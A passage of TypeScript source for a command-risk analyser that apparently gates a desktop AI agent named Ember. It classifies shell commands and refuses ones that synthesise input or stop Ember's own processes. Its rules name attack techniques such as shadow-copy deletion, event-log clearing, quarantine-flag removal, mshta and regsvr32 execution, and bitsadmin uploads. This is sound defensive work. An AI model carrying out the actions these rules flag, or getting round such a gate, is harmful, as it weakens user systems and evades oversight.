      "org.gnome.settings-daemon.plugins.remote-display", "org.gnome.login-screen", "org.gnome.system.location",
    ],
  },
  {
    rule: "system.autostart", says: "Sets a command, an extension or a default program that runs later.",
    prefixes: [
      "org.gnome.settings-daemon.plugins.media-keys", "org.gnome.shell.enabled-extensions", "org.gnome.shell.disabled-extensions",
      "org.gnome.shell.disable-user-extensions", "org.gnome.shell.allow-extension-installation", "org.gnome.shell.development-tools",
      "org.gnome.shell.extensions", "org.gnome.desktop.default-applications",
    ],
  },
];
/**
 * A GNOME settings write to `key` (dotted, lower case; null: a key Ember can't see, which could be any): the areas it
 * reaches, or plain desktop settings. `tree`: everything under `key` changes (a reset of a folder, a load).
 */
function settingsWrite(h: H, key: string | null, tree: boolean, form: (prefix: string) => string = p => p): void {
  let hit = false;
  for (const area of SETTINGS_AREAS) {
    const reaches = key === null || area.prefixes.map(form).some(p => key === p || key.startsWith(`${p}.`) || (tree && (key === "" || p.startsWith(`${key}.`))));
    if (reaches) { hit = true; h.e.add("system", area.rule, area.says); }
  }
  if (!hit) h.e.add("system", "system.settings", "Changes your desktop settings.");
}
reg(NATIVE, ["gsettings"], h => {
  // gsettings [--schemadir DIR] <command> SCHEMA[:PATH] [KEY] [VALUE]: only set, reset and reset-recursively change anything.
  let k = 0;
  while (h.args[k]?.v === "--schemadir") k += 2;
  if (h.args[k]?.v?.startsWith("--schemadir=")) k++;
  const verb = h.args[k];
  if (!verb) return;
  if (verb.v === null) { settingsWrite(h, null, true); return; }
  if (!/^(set|reset|reset-recursively)$/.test(verb.v)) return;
  const schema = h.args[k + 1]?.v ?? null;
  const name = h.args[k + 2]?.v ?? null;
  const recursive = verb.v === "reset-recursively";
  if (schema === null || (!recursive && name === null)) { settingsWrite(h, null, true); return; }
  const id = schema.split(":")[0].toLowerCase();
  settingsWrite(h, recursive ? id : `${id}.${name!.toLowerCase()}`, recursive);
});
/**
 * Where a settings area's keys live in dconf, dotted: its schema id, except for the two schemas GNOME keeps elsewhere
 * (org.gnome.system.proxy at /system/proxy/, org.gnome.desktop.default-applications at /org/gnome/desktop/applications/).
 */
const dconfForm = (id: string): string =>
  id.replace(/^org\.gnome\.system\.proxy(?=\.|$)/, "system.proxy").replace(/^org\.gnome\.desktop\.default-applications(?=\.|$)/, "org.gnome.desktop.applications");
reg(NATIVE, ["dconf"], h => {
  // dconf write KEY VALUE, reset [-f] KEY|DIR/, load [-f] DIR/ (keys from stdin), update and compile (the system's or a
  // file's database). Keys are paths (`/org/gnome/desktop/screensaver/lock-enabled`); a folder ends with `/`.
  const verb = h.args[0]?.v;
  if (verb === undefined) return;
  if (verb === null) { settingsWrite(h, null, true); return; }
  const ops = h.args.slice(1).filter(a => a.v !== "-f");
  const dotted = (p: string): string => p.replace(/^\/+|\/+$/g, "").replace(/\//g, ".").toLowerCase();
  switch (verb) {
    case "write": case "reset": case "load": {
      const target = ops[0]?.v ?? null;
      if (target === null) { settingsWrite(h, null, true); return; }
      settingsWrite(h, dotted(target), verb === "load" || target.endsWith("/"), dconfForm);
      return;
    }
    case "update": settingsWrite(h, null, true); return;
    case "compile": { const out = ops[0]; if (out) h.e.usePath(out, "write", h.sc); h.e.readArgs(ops.slice(1), h.sc); return; }
    default: return;
  }
});
/** macOS preference domains whose settings weaken a protection: the screen saver's password, the firewall, remote access, updates. */
const DEFAULTS_SECURITY = /^com\.apple\.(screensaver|alf|security(\..+)?|screensharing|remotemanagement|remotedesktop|softwareupdate|commerce)$/i;
/** macOS preference domains that start something at login or choose which program opens a file or link (review #175). */
const DEFAULTS_AUTOSTART = /^com\.apple\.(loginitems|loginwindow|backgroundtaskmanagementagent|launchservices)(\/|$)/i;
/**
 * The preference domains a property list holds, when it is one macOS reads settings from: a file in a Library/Preferences
 * folder (`…/Library/Preferences/com.apple.screensaver.plist` holds com.apple.screensaver), or in its ByHost folder,
 * whose names end with the computer's id (`com.apple.screensaver.<id>`). Empty for any other file (review #108).
 */
function prefsDomains(path: string): string[] {
  const m = /(?:^|\/)Library\/Preferences\/(ByHost\/)?(.+?)(?:\.plist)?$/i.exec(path);
  if (!m) return [];
  return m[1] ? [m[2], m[2].replace(/\.[^.]*$/, "")] : [m[2]];
}
/**
 * A change to preference domains (null: ones Ember can't name, which could be any): those that weaken a protection, and
 * LSQuarantine (`lsq`: the change names it) in any, ask as security; those that start something at login ask as autostart.
 */
function prefsChange(h: H, domains: readonly string[] | null, lsq: boolean): void {
  if (domains === null || lsq || domains.some(d => DEFAULTS_SECURITY.test(d))) h.e.add("system", "system.security", "Turns off or weakens a security protection.");
  if (domains === null || (!lsq && domains.some(d => DEFAULTS_AUTOSTART.test(d)))) h.e.add("system", "path.autostart", "Schedules something to run later or at login.");
}
/** A property list written by PlistBuddy or plutil: a preferences file is judged as a change to its domains. */
function prefsFile(h: H, obj: Obj, lsq: boolean): void {
  const domains = obj.abs === null ? [] : prefsDomains(obj.abs);
  if (domains.length) prefsChange(h, domains, lsq);
}
reg(NATIVE, ["defaults"], h => {
  // defaults [-currentHost | -host NAME] <verb> <domain> …; the domain may be `-g`, `-app NAME`, a name or a path.
  let k = 0;
  while (h.args[k]?.v === "-currentHost" || h.args[k]?.v === "-host") k += h.args[k].v === "-host" ? 2 : 1;
  const verb = h.args[k]?.v;
  if (verb === undefined) return;
  const rest = h.args.slice(k + 1);
  const app = rest[0]?.v === "-app";
  const domain = app ? null : rest[0]?.v ?? null;
  // A domain given as a path is that file, `.plist` added when missing (review #175).
  const file = domain !== null && /^[~/]/.test(domain) ? lit(domain.endsWith(".plist") ? domain : `${domain}.plist`) : null;
  if (verb === "export") {
    if (file) h.e.usePath(file, "read", h.sc);
    if (rest[1]) overwrites(h, rest[1]);
    return;
  }
  if (verb !== null && !/^(write|delete|import|rename)$/.test(verb)) { if (file) h.e.usePath(file, "read", h.sc); return; }
  if (verb === "import" && rest[1] && rest[1].v !== "-") h.e.usePath(rest[1], "read", h.sc);
  const lsq = rest.some(a => /LSQuarantine/i.test(a.v ?? ""));
  // A path domain is judged as a write to its file and as a change to the domain it holds (review #108).
  if (file) { const obj = h.e.usePath(file, "write", h.sc); prefsChange(h, prefsDomains(obj.abs ?? file.v ?? ""), lsq); return; }
  const unknown = verb === null || (!app && domain === null);
  prefsChange(h, unknown ? null : domain === null ? [] : [domain], lsq);
});
// Property lists edited in place (review #175): a LaunchAgent built with PlistBuddy or plutil runs at the next login.
reg(NATIVE, ["PlistBuddy", "plistbuddy"], h => {
  // PlistBuddy [-x] [-c "<command>"]… <file>: Set, Add, Delete, Clear, Copy, Merge and Import change the file (Merge
  // and Import read another one); with no -c it reads its commands from the terminal or stdin.
  const cmds: (string | null)[] = [];
  const ops: Arg[] = [];
  for (let k = 0; k < h.args.length; k++) {
    const v = h.args[k].v;
    if (v === "-c") { cmds.push(h.args[k + 1]?.v ?? null); k++; continue; }
    if (v !== null && /^-[xh]$/.test(v)) continue;
    ops.push(h.args[k]);
  }
  const file = ops[0];
  let writes = false;
  for (const c of cmds) {
    if (c === null) { writes = true; continue; }
    const [verb, ...words] = c.trim().split(/\s+/);
    const w = (verb ?? "").toLowerCase();
    if (/^(set|add|delete|clear|copy|merge|import|save|revert)$/.test(w)) writes = true;
    const other = w === "merge" ? words[0] : w === "import" ? words[1] : undefined;
    if (other) h.e.usePath(lit(other), "read", h.sc);
  }
  if (cmds.length === 0) {
    if (h.s.stdin === null) h.e.unclear("unclear.interactive", SAYS.interactive);
    else { writes = true; h.e.unclear("unclear.stdin-code", "Runs code Ember can't see."); }
  }
  if (file) {
    const obj = h.e.usePath(file, writes ? "write" : "read", h.sc);
    if (writes) prefsFile(h, obj, cmds.some(c => c !== null && /LSQuarantine/i.test(c)));
  }
  // A command or file Ember can't see may be any, as for any program's unresolved argument.
  if (file?.v === null || cmds.includes(null)) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
});
/** plutil's options that take values, and how many. */
const PLUTIL_VALUES: Readonly<Record<string, number>> = { "-o": 1, "-e": 1, "-expect": 1, "-remove": 1, "-create": 1, "-convert": 1, "-extract": 2, "-type": 1 };
reg(NATIVE, ["plutil"], h => {
  // plutil <command> … [-s] [-r] [-n] [-o OUT | -e EXT] [--] FILE…, options anywhere: -insert|-replace KEY -TYPE VALUE
  // (-array and -dictionary take no value), -remove KEY, -create FORMAT and -convert FORMAT change every FILE in place,
  // or write -o's (`-` is stdout); -extract KEY FORMAT, -type KEY, -lint, -p and -help only read. A command Ember
  // can't see may change them (review #175).
  let verb: string | null | undefined;
  let out: Arg | undefined;
  const files: Arg[] = [];
  for (let k = 0; k < h.args.length; k++) {
    const a = h.args[k];
    const v = a.v;
    if (v === "--") { files.push(...h.args.slice(k + 1)); break; }
    if (v === null && verb === undefined) { verb = null; continue; }
    if (v === null || !v.startsWith("-") || v === "-") { files.push(a); continue; }
    if (verb === undefined && /^-(insert|replace|remove|create|convert|extract|type|lint|p|help)$/.test(v)) verb = v;
    if (v === "-o") out = h.args[k + 1];
    if (v === "-insert" || v === "-replace") k += /^-(array|dictionary)$/.test(h.args[k + 2]?.v ?? "") ? 2 : 3;
    else k += PLUTIL_VALUES[v] ?? 0;
  }
  const lsq = h.args.some(a => /LSQuarantine/i.test(a.v ?? ""));
  if (out && out.v !== "-") prefsFile(h, h.e.usePath(out, "write", h.sc), lsq);
  if (verb === null || (verb !== undefined && /^-(insert|replace|remove|create|convert)$/.test(verb) && !out)) for (const f of files) prefsFile(h, h.e.usePath(f, "write", h.sc), lsq);
  else h.e.readArgs(files, h.sc);
  if (verb === null || files.some(f => f.v === null)) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
});
// Which certificates the computer trusts (review #108): NSS's certutil, p11-kit's trust, the system bundle, macOS's
// trust settings. Windows' certutil is judged below its own handler.
const TRUST_SAYS = "Changes which certificates your computer trusts.";
reg(NATIVE, ["trust"], h => {
  const verb = firstOperand(h.args);
  if (verb.v === null) { if (verb.at < h.args.length) h.e.add("system", "system.security", TRUST_SAYS); return; }
  if (verb.v === "anchor" || verb.v === "extract-compat") { h.e.add("system", "system.security", TRUST_SAYS); return; }
  if (verb.v === "extract") { const out = h.args.slice(verb.at + 1).filter(a => !isOption(a)).pop(); if (out) overwrites(h, out); }
});
reg(NATIVE, ["update-ca-trust", "update-ca-certificates"], h => { h.e.add("system", "system.security", TRUST_SAYS); });
reg(NATIVE, ["systemsetup"], h => {
  const flags = h.args.map(a => (a.v ?? "").toLowerCase());
  if (flags.some(f => /^-set(remotelogin|remoteappleevents)$/.test(f))) h.e.add("system", "system.security", "Turns off or weakens a security protection.");
  else if (flags.some(f => f.startsWith("-set") || f === "")) h.e.add("system", "system.kernel", "Changes how the system works.");
});
reg(NATIVE, ["setenforce", "semanage", "auditctl", "aa-disable", "aa-complain", "apparmor_parser", "spctl", "xattr", "vssadmin", "wbadmin", "wevtutil", "auditpol"], h => {
  const a = h.args.map(x => (x.v ?? "").toLowerCase());
  if (h.key === "xattr") {
    if (a.some(x => /^-[a-z]*[dc]/.test(x)) && (a.some(x => x === "com.apple.quarantine") || a.some(x => /^-[a-z]*c/.test(x)))) h.e.add("system", "system.security", "Turns off or weakens a security protection.");
    return;
  }
  if (h.key === "spctl" && a.every(x => /^--?(status|assess|a|t|type|context|verbose|v|raw)/.test(x) || !x.startsWith("-"))) return;
  if (h.key === "vssadmin" || h.key === "wbadmin") { if (a.some(x => /^(delete|resize)$/.test(x))) h.e.add("destroy", "system.backups", "Deletes backups and restore points."); return; }
  if (h.key === "wevtutil") { if (a.some(x => /^(cl|clear-log|sl|set-log|um|uninstall-manifest)$/.test(x))) h.e.add("system", "system.security", "Turns off or weakens a security protection."); return; }
  if (h.key === "auditctl" && a.every(x => /^-[ls]$/.test(x))) return;
  h.e.add("system", "system.security", "Turns off or weakens a security protection.");
});
reg(NATIVE, ["wmic"], h => {
  const a = h.args.map(x => (x.v ?? "").toLowerCase());
  if (a.includes("shadowcopy") && a.includes("delete")) { h.e.add("destroy", "system.backups", "Deletes backups and restore points."); return; }
  // `wmic process where … delete` (or `call terminate`) stops processes: Ember's are refused.
  if (a[0] === "process" && (a.includes("delete") || (a.includes("call") && a.includes("terminate")))) {
    const where = h.args.map(x => x.v ?? "").join(" ");
    const pid = /processid\s*=\s*'?(\d+)/i.exec(where)?.[1];
    const name = /\bname\s*=\s*'?"?([^'"\s]+)/i.exec(where)?.[1];
    if (pid && h.e.ctx.ember.pids.includes(Number(pid))) { h.e.refuseWith("ember.process", "safety"); return; }
    if (name && (emberNamed(h, name) || emberNamed(h, name.replace(/\.exe$/i, "")))) { h.e.refuseWith("ember.process", "safety"); return; }
    if (!pid && !name) { h.e.unclear("unclear.wmic", "Ember can't tell which programs this stops."); }
    killPids(h, [pid ?? name ?? null]);
    return;
  }
  if (a.some(x => /^(call|delete|set|create)$/.test(x))) h.e.unclear("unclear.wmic", "Runs code Ember can't see.");
});
// mshta given a URL fetches an HTML application and runs it.
reg(NATIVE, ["mshta"], h => {
  if (h.args.some(a => a.v !== null && /^(https?|ftp):/i.test(a.v))) { h.e.add("escape", "escape.download-run", SAYS.downloadsAndRuns); return; }
  if (h.args.some(a => a.v !== null && /^(vbscript|javascript):/i.test(a.v) && SENDKEYS.test(a.v))) { h.e.refuseWith("ember.input", "input"); return; }
  h.e.unclear("unclear.mshta", "Runs code Ember can't see.");
  h.e.readArgs(h.args.filter(a => !(a.v ?? "").startsWith("/")), h.sc);
});
reg(NATIVE, ["wscript", "cscript", "regsvr32", "regsvr", "installutil", "regasm", "regsvcs", "cmstp", "msdt", "pcalua", "scriptrunner", "syncappvpublishingserver", "odbcconf", "msxsl", "ieexec", "control", "presentationhost", "mavinject"], h => {
  h.e.unclear(`unclear.${h.key}`, "Runs code Ember can't see.");
  h.e.readArgs(h.args.filter(a => !(a.v ?? "").startsWith("/")), h.sc);
});
reg(NATIVE, ["bitsadmin"], h => {
  const a = h.args.map(x => (x.v ?? "").toLowerCase());
  if (a.includes("/upload")) { h.e.add("publish", "send.http", "Sends data to another computer."); return; }
  if (a.includes("/transfer")) { const dest = h.args[h.args.length - 1]; if (dest?.v && !URL_LIKE.test(dest.v)) { h.e.usePath(dest, "write", h.sc); h.e.download(dest.v, h.sc); } return; }
  if (a.some(x => /^\/(list|info|getstate|monitor|util|\?)/.test(x))) return;
  h.e.add("escape", "escape.background", SAYS.keepsRunning);
});
reg(NATIVE, ["forfiles"], h => {
  const at = h.args.findIndex(a => /^[/-]c$/i.test(a.v ?? ""));
  if (at < 0) { h.e.readArgs([], h.sc); return; }
  const text = h.args[at + 1]?.v;
  if (!text) { h.e.unclear("unclear.shell-text", "It runs a command Ember can't see."); return; }
  const cmd = text.replace(/@(file|fname|path|relpath|ext|isdir|fsize|fdate|ftime)\b/gi, "%EMBER_FORFILES%").replace(/^cmd(\.exe)?\s+\/c\s+/i, "");
  h.e.nested(cmd, "cmd", h.sc, "forfiles /c");
});
reg(NATIVE, ["doskey"], h => { if (h.args.length) h.e.unclear("unclear.alias", "It defines an alias Ember can't follow."); });

// Input synthesis and Ember's own windows and bus (§3.5.8).
reg(NATIVE, [...INPUT_SYNTH], h => { h.e.refuseWith("ember.input", "input"); });
reg(NATIVE, ["nircmd", "nircmdc"], h => {
  const verb = (h.args[0]?.v ?? "").toLowerCase();
  if (/^(sendkey|sendkeypress|sendmouse|setcursor|movecursor|win|dlg|sendmsg)/.test(verb)) { h.e.refuseWith("ember.input", "input"); return; }
  h.e.unclear("unclear.nircmd", SAYS.unclear);
});
reg(NATIVE, ["gdbus", "dbus-send", "busctl", "qdbus", "qdbus6", "dbus-monitor"], h => {
  const text = h.args.map(a => a.v ?? "").join(" ");
  if (/org\.a11y\.|\bember\b/i.test(text)) { h.e.refuseWith("ember.input", "input"); return; }
  if (h.key === "dbus-monitor") { h.e.add("secret", "secret.program", SAYS.secrets); return; }
  if (/\b(introspect|list|status|tree|monitor|get-property)\b/.test(text) && !/\b(call|emit|set-property|--print-reply.*\bcall\b)\b/.test(text) && !h.args.some(a => /^--(type=method_call|print-reply)/.test(a.v ?? ""))) return;
  h.e.unclear("unclear.dbus", "Ember can't tell what this message to a desktop service does.");
});
reg(NATIVE, ["wmctrl", "xprop", "xdotool-window", "xwininfo", "xkbcomp", "xmodmap", "setxkbmap", "xinput"], h => {
  const text = h.args.map(a => a.v ?? "").join(" ");
  if (/ember/i.test(text) && (h.key === "wmctrl" || (h.key === "xprop" && /-set|-remove|-f\b/.test(text)))) { h.e.refuseWith("ember.input", "input"); return; }
  if (h.key === "wmctrl" && h.args.some(a => /^-[a-zA-Z]*[acrRbeoTNI]/.test(a.v ?? "") && !/^-[lmd]$/.test(a.v ?? ""))) { h.e.unclear("unclear.windows", "It moves or closes windows Ember can't vouch for."); return; }
  if (h.key === "xprop" && /-set|-remove/.test(text)) { h.e.unclear("unclear.windows", "It changes windows Ember can't vouch for."); return; }
  if (/^(xkbcomp|xmodmap|setxkbmap|xinput)$/.test(h.key) && h.args.length) h.e.unclear("unclear.input-devices", "It changes the keyboard or pointer.");
});
reg(NATIVE, ["osascript"], h => {
  const at = h.args.findIndex(a => a.v === "-e");
  if (at >= 0) {
    const code = h.args.filter((a, k) => h.args[k - 1]?.v === "-e" && a.v !== null).map(a => a.v).join("\n");
    if (/keystroke|key code|\bclick\b|system events/i.test(code)) { h.e.refuseWith("ember.input", "input"); return; }
    if (/with administrator privileges/i.test(code)) h.e.add("system", "system.sudo", SAYS.root);
    emberText(h, code);
    h.e.unclear("unclear.inline-code", "It runs code given on the command line.");
    return;
  }
  h.e.unclear("unclear.script", "It runs a script Ember can't see.");
});
reg(NATIVE, ["open"], h => {
  if (h.sc.os !== "darwin" && !(h.sc.os === "linux")) { generic(h); return; }
  if (h.args.some(a => /^ember:/i.test(a.v ?? ""))) { h.e.refuseWith("ember.url", "input"); return; }
  launcher(h);
});
reg(NATIVE, ["start"], h => {
  // POSIX `start` (rare): a launcher; cmd's start is a built-in (below).
  launcher(h);
});
reg(NATIVE, [...LAUNCHERS].filter(k => !["open", "start", "ii", "invoke-item"].includes(k)), h => {
  if (h.key === "explorer" && h.args.length === 0) { h.e.add("escape", "escape.launcher", SAYS.opensProgram); return; }
  launcher(h);
});
reg(NATIVE, [...GUI_PROGRAMS].filter(k => !NATIVE[k]), h => {
  h.e.unclear("unclear.gui", SAYS.openApp);
  h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc);
});
reg(NATIVE, [...INTERACTIVE].filter(k => !NATIVE[k]), h => {
  interactive(h);
  h.e.readArgs(h.args.filter(a => !isOption(a) && !/^[0-9]+$/.test(a.v ?? "")), h.sc);
});
reg(NATIVE, [...SECRET_PROGRAMS].filter(k => !NATIVE[k]), h => { h.e.add("secret", "secret.program", SAYS.secrets); });
reg(NATIVE, [...CLIPBOARD_READERS].filter(k => !NATIVE[k]), h => { h.e.add("secret", "secret.clipboard", SAYS.clipboard); });
reg(NATIVE, [...SCREENSHOTTERS].filter(k => !NATIVE[k]), h => { h.e.add("secret", "secret.screen", SAYS.screen); h.e.readArgs(h.args.filter(a => !isOption(a)), h.sc); });
reg(NATIVE, [...DISK_TOOLS].filter(k => !NATIVE[k]), h => { h.e.add("destroy", "disk.erase", "Erases or repartitions a disk."); });
reg(NATIVE, ["cipher"], h => { if (h.args.some(a => /^\/w/i.test(a.v ?? ""))) h.e.add("destroy", "disk.wipe", "Wipes free space on a disk."); else if (h.args.some(a => /^\/(e|d|r|k|x|u|n|h)$/i.test(a.v ?? ""))) h.e.add("secret", "secret.program", SAYS.secrets); });
reg(NATIVE, ["format"], h => {
  if (h.sc.os === "win32" || h.sc.family !== "posix" || h.key === "format") h.e.add("destroy", "disk.erase", "Erases or repartitions a disk.");
});
reg(NATIVE, ["robocopy"], h => {
  const flags = h.args.map(a => (a.v ?? "").toLowerCase());
  const [src, dst] = h.args.filter(a => !(a.v ?? "").startsWith("/"));
  // `robocopy SOURCE DEST [FILE…] [/OPTION…]`: the names before the first option are the files it copies from the
  // source folder (all of them by default); names after one belong to it (/XF's, /XD's).
  const first = h.args.findIndex(a => (a.v ?? "").startsWith("/"));
  const files = (first < 0 ? h.args : h.args.slice(0, first)).filter(a => !(a.v ?? "").startsWith("/")).slice(2);
  const move = flags.some(f => /^\/(move|mov)$/.test(f));
  const inSrc = (f: Arg): Arg => (src?.v != null && f.v !== null ? { ...f, v: win32.join(src.v, f.v), glob: f.glob || /[*?]/.test(f.v) } : { v: null, raw: f.raw, glob: false });
  const named = files.length > 0 && !flags.some(f => /^\/(s|e|mir)$/.test(f));
  if (src && named) { h.e.usePath(src, "list", h.sc); for (const f of files) h.e.usePath(inSrc(f), move ? "move" : "read", h.sc); }
  else if (src) h.e.usePath(src, move ? "move" : "readTree", h.sc);
  const destObj = dst ? h.e.usePath(dst, flags.some(f => /^\/(mir|purge)$/.test(f)) ? "deleteTree" : "write", h.sc) : null;
  // A download it copies or moves is the download in the destination folder, as with copy and Copy-Item
  // (commands-remote-c2-2): the file of its name there. A folder or pattern copy puts each download the folder holds
  // under the same name there, and a source folder that is (or may be) a download itself leaves files Ember can't
  // name; never the destination folder itself, whose own tools would all ask (commands-remote-v5-6).
  if (src && destObj?.abs) {
    if (files.length) h.e.carryCopies(files.map(inSrc).filter(f => !f.glob), { ...destObj, text: `${destObj.text.replace(/[\\/]+$/, "")}\\` }, h.sc);
    if ((!named || files.some(f => f.glob || f.v === null)) && src.v !== null && h.sc.cwd) {
      const from = resolveTargetPath(src.v, { os: h.sc.os, home: h.sc.home ?? "", cwd: h.sc.cwd });
      if (h.e.isDownloaded(src, h.sc)) h.e.carryUnnamed(destObj.abs, true, h.sc);
      else for (const d of [...h.e.ctx.downloaded, ...h.e.downloads]) if (d !== from && isUnder(d, from, h.sc.path)) h.e.carryDownload(win32.join(destObj.abs, win32.relative(from, d)), h.sc);
    }
  }
  if (flags.some(f => /^\/(mir|purge|move|mov)$/.test(f))) h.e.add("destroy", "cmd.robocopy", `Deletes files in ${destObj?.text ?? "the destination"} that aren't in ${src?.v ?? "the source"}.`, { objects: destObj ? [destObj] : [] });
  else if (destObj?.abs) h.e.add("destroy", "cmd.robocopy", `Replaces files in ${destObj.text} if they exist.`, { objects: [destObj], ifExists: destObj.abs });
});
reg(NATIVE, ["xcopy"], h => cmdCopy(h));

// ------------------------------------------------------------------------------------------------------------------
// WSL launchers (§3.4.5, critique wsl-1) and Windows shells nested in other commands.

const DISTRO_LAUNCHER = /^(ubuntu(\d{2,4}(lts)?)?|debian|kali(-linux)?|opensuse.*|sles.*|suse.*|fedora.*|almalinux.*|oraclelinux.*|archlinux|alpine|pengwin|centos.*|rhel.*|rocky.*|clearlinux|gentoo|nixos|void)$/;
function wslTail(h: H, tail: Arg[], o: { exec: boolean; distro: string | null; cd: string | null; user: string | null }): void {
  const winCwd = h.sc.os === "win32" ? h.sc.cwd : null;
  const cwd = o.cd === null ? (winCwd && /^[A-Za-z]:/.test(winCwd) ? toMount(winCwd, "/mnt") : h.sc.wsl ? h.sc.cwd : null) : o.cd === "~" ? null : o.cd.startsWith("/") ? o.cd : null;
  const windows = h.sc.windows ?? (h.sc.os === "win32" && h.sc.home ? windowsContextOf(h.sc.home) : null);
  const path = pathEnv({ flavour: "posix", os: "linux", home: null, cwd: null, mountRoot: "/mnt", windows, ember: [] });
  const inner: Partial<Scope> = { os: "linux", path, cwd, home: null, wsl: true, mountRoot: "/mnt", windows, fromWsl: false, family: "posix", shell: "sh", foreign: true };
  h.e.windowsReach = h.e.windowsReach || h.sc.wsl;
  if (tail.length === 0) { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (o.exec) { h.e.payload(tail, child(h.sc, inner), "wsl"); return; }
  // Without --exec, wsl hands the joined words to the distro's default shell (critique wsl-1).
  if (tail.some(a => a.v === null || /[\s'"\\$`;&|<>(){}*?[\]~!#]/.test(a.v))) {
    h.e.unclear("unclear.wsl-join", "Ember can't tell exactly what the distro's shell would get.");
    const joined = tail.map(a => a.v ?? a.raw).join(" ");
    h.e.nested(joined, "sh", h.sc, "wsl", inner, pipedInto(h));
    return;
  }
  h.e.nested(tail.map(a => a.v).join(" "), "sh", h.sc, "wsl", inner, pipedInto(h));
}
/** What a wrapper reading a pipe hands the text it runs: its stdin, and whether a fetch feeds it. */
const pipedInto = (h: H): { fetch: boolean } | null => (h.s.stdin === "pipe" ? { fetch: h.s.fetchBefore } : null);
reg(NATIVE, ["wsl", "wslg", "wslhost"], h => {
  let exec = false;
  let distro: string | null = null;
  let cd: string | null = null;
  let user: string | null = null;
  let k = 0;
  const a = h.args;
  for (; k < a.length; k++) {
    const v = a[k].v;
    if (v === null) { h.e.unclear("unclear.wsl-option", "Ember can't tell which WSL command this runs."); return; }
    const l = v.toLowerCase();
    if (l === "--") { k++; break; }
    if (l === "-e" || l === "--exec") { exec = true; k++; break; }
    if (l === "-d" || l === "--distribution" || l === "--distribution-id") { distro = a[++k]?.v ?? null; continue; }
    if (l === "-u" || l === "--user") {
      user = a[++k]?.v ?? null;
      h.e.add("system", "wsl.user", user && /^(root|0)$/i.test(user) ? "Runs as root in WSL." : `Runs as another user in WSL (${user ?? "?"}).`);
      continue;
    }
    if (l === "--cd") { cd = a[++k]?.v ?? null; continue; }
    if (l === "--shell-type") { k++; continue; }
    if (l === "--system") { h.e.add("system", "wsl.system", "Runs in WSL's own system distro."); continue; }
    if (l === "--export") { h.e.add("secret", "wsl.export", "Copies a whole Linux system, with its keys and passwords."); const out = a[k + 2]; if (out && out.v !== "-") h.e.usePath(out, "write", h.sc); return; }
    if (l === "--unregister") { h.e.add("destroy", "wsl.unregister", `Deletes the WSL distro ${a[k + 1]?.v ?? "?"} and everything in it.`); return; }
    if (/^(-l|--list|--status|-v|--version|--help|-\?)$/.test(l)) return;
    if (/^(--mount|--unmount|--import|--import-in-place|--set-version|--manage|--debug-shell|--update|--install|--shutdown|--terminate|-t|--set-default|-s|--set-default-version|--uninstall)$/.test(l)) {
      h.e.add("system", "wsl.manage", "Changes how WSL works.");
      return;
    }
    if (l.startsWith("-")) { h.e.unclear("unclear.wsl-option", "Ember can't tell which WSL command this runs."); return; }
    break;
  }
  if (distro && /^(docker-desktop|rancher-desktop)/i.test(distro)) h.e.add("system", "wsl.tool-distro", `Acts inside ${distro}, which another program owns.`);
  if (h.key === "wslg") exec = false;
  wslTail(h, a.slice(k), { exec, distro, cd, user });
});
/** bash.exe on Windows (WSL's), and a distro's own launcher (`ubuntu.exe run …`, `ubuntu.exe config --default-user`). */
function distroLauncher(h: H): void {
  const verb = (h.args[0]?.v ?? "").toLowerCase();
  if (h.key === "bash") {
    const c = h.args.findIndex(a => a.v === "-c");
    if (c >= 0) { const t = h.args[c + 1]; wslTail(h, t ? [t] : [], { exec: false, distro: null, cd: null, user: null }); return; }
    wslTail(h, h.args, { exec: false, distro: null, cd: null, user: null });
    return;
  }
  if (verb === "run") { wslTail(h, h.args.slice(1), { exec: false, distro: h.key, cd: null, user: null }); return; }
  if (verb === "config" || verb === "install") { h.e.add("system", "wsl.manage", "Changes how WSL works."); return; }
  if (verb === "") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  h.e.unclear("unclear.wsl-option", "Ember can't tell which WSL command this runs.");
}

/** cmd /c and powershell -Command nested in another command (§3.4.5), with Windows' path rules from WSL (critique wsl-4, wsl-5). */
function windowsScope(h: H, family: "cmd" | "powershell"): Partial<Scope> | null {
  if (!h.sc.wsl || h.sc.family !== "posix") return { family, shell: family };
  const w = h.sc.windows;
  const home = w?.home ?? null;
  const flavour = "win32" as const;
  const path = pathEnv({ flavour, os: "win32", home, cwd: null, windows: w, ember: w?.emberPaths ?? [] });
  let cwd: string | null = null;
  const posixCwd = h.sc.cwd;
  const mount = h.sc.mountRoot ?? "/mnt";
  if (posixCwd && isUnder(posixCwd, mount, h.sc.path) && posixCwd !== mount) {
    const rest = posixCwd.slice(mount.length + 1);
    const drive = rest.split("/")[0];
    if (/^[a-z]$/i.test(drive)) cwd = `${drive.toUpperCase()}:\\${rest.split("/").slice(1).join("\\")}`.replace(/\\$/, "\\");
  }
  if (cwd === null) {
    if (family === "cmd") {
      h.e.unclear("unclear.cmd-linux-folder", SAYS.cmdLinuxFolder);
      cwd = w?.systemRoot ?? "C:\\Windows";
    } else cwd = posixCwd ? `\\\\wsl.localhost\\distro${posixCwd.replace(/\//g, "\\")}` : null;
  }
  h.e.windowsReach = true;
  return { family, shell: family, os: "win32", path: { ...path, cwd }, cwd, home, wsl: false, mountRoot: null, windows: w, fromWsl: true, foreign: true };
}
reg(NATIVE, ["cmd"], h => {
  const at = h.args.findIndex(a => a.v !== null && /^\/[ckr]$/i.test(a.v));
  if (at < 0) {
    if (h.args.some(a => /^\/[?]$/.test(a.v ?? ""))) return;
    // cmd reading its commands from a pipe runs them (download-and-run after a fetch).
    if (h.s.stdin === "pipe" || h.s.stdin === "heredoc") { intoInterpreter(h); return; }
    h.e.unclear("unclear.interactive", SAYS.interactive);
    return;
  }
  const tail = h.args.slice(at + 1);
  if (tail.some(a => a.v === null) || (tail.length > 1 && tail.some(a => (a.v ?? "").includes("\"")))) { h.e.unclear("unclear.shell-text", "Ember can't tell exactly what cmd would get."); return; }
  if (/^\/k$/i.test(h.args[at].v ?? "")) h.e.unclear("unclear.interactive", SAYS.interactive);
  const text = tail.map(a => a.v).join(" ").replace(/^"(.*)"$/s, "$1");
  const sc = windowsScope(h, "cmd");
  if (!sc) return;
  h.e.nested(text, "cmd", h.sc, "cmd /c", sc);
});
reg(NATIVE, ["powershell", "pwsh", "powershell_ise"], h => {
  if (h.key === "powershell_ise") { h.e.unclear("unclear.gui", SAYS.openApp); return; }
  const a = h.args;
